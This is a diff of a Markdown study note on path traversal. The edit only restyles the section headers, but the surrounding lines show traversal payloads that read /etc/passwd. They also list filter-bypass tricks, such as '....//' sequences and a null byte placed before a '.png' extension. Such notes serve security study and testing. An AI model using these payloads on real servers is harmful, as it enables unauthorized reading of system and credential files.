@@ -1,13 +1,13 @@
 # Path traversal
 
-## General info
+## <mark style="color:yellow;">General info</mark>
 
 * `<img src="/loadImage?filename=218.png">`
 * An attacker can request the following URL to retrieve the /etc/passwd file from the server's filesystem
 * `https://insecure-website.com/loadImage?filename=../../../etc/passwd`
 * On Windows, both `../` and `..\` are valid directory traversal sequences
 
-## Bypass defences
+## <mark style="color:yellow;">Bypass defences</mark>
 
 * elimination (strip): `../` -> `....//`
   * Test: try to change the orginal request `GET /image?filename=1.jpg` to `GET /image?filename=../1.jpg`
@@ -18,7 +18,7 @@
 * require to end with an expected file extension es. `.png` -> `filename=../../../etc/passwd%00.png`
 * others
 
-## Tips
+## <mark style="color:yellow;">Tips</mark>
 
 * Don't always trust error messages
   * `GET /image?filename=/etc/passwd` -> "No such file"
